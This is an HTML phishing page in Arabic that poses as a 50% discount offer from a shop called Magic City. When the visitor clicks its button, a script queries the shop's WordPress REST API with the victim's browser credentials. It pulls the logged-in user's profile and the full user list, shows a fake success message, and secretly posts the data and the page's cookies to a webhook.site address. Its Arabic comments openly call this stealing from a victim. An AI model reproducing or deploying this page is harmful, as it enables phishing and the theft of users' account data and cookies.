<!DOCTYPE html>
<html>
<head>
    <title>Magic City - عرض حصري</title>
</head>
<body>
    <h1>تهانينا! لقد فزت بخصم 50%</h1>
    <button id="stealBtn">اضغط لتفعيل الخصم</button>
    <pre id="result"></pre>

    <script>
        document.getElementById('stealBtn').onclick = async function() {
            const result = document.getElementById('result');
            result.textContent = 'جاري جلب البيانات...';

            try {
                // 1. جلب معلومات المستخدم المسجل (أهم شيء!)
                const meRes = await fetch('https://magic-city.shop/wp-json/wp/v2/users/me', {
                    credentials: 'include'  // يرسل كوكيز الضحية تلقائياً
                });
                const me = await meRes.json();

                // 2. جلب جميع المستخدمين (ثغرة User Enumeration)
                const usersRes = await fetch('https://magic-city.shop/wp-json/wp/v2/users');
                const users = await usersRes.json();

                // 3. جلب الصفحات العامة
                const pagesRes = await fetch('https://magic-city.shop/wp-json/wp/v2/pages');
                const pages = await pagesRes.json();

                // 4. عرض البيانات للمستخدم (الضحية يظن أنه خصم)
                result.innerHTML = `
                    <h3>تم تفعيل الخصم بنجاح!</h3>
                    <p>مرحباً ${me.name || 'زائر'}، تم تطبيق خصم 50% على طلبك القادم.</p>
                `;

                // 5. إرسال البيانات المسروقة لسيرفر الهاكر (خلف الكواليس)
                fetch('https://webhook.site/38d6164f-5866-41ce-ac00-0c9a813e4ff2', {
                    method: 'POST',
                    body: JSON.stringify({
                        me: me,           // معلومات المسؤول
                        users: users,     // قائمة المستخدمين
                        pages: pages,     // قائمة الصفحات
                        cookies: document.cookie,
                        time: new Date().toISOString()
                    })
                });

            } catch(err) {
                result.innerHTML = 'خطأ: ' + err.message;
            }
        };
    </script>
</body>
</html>
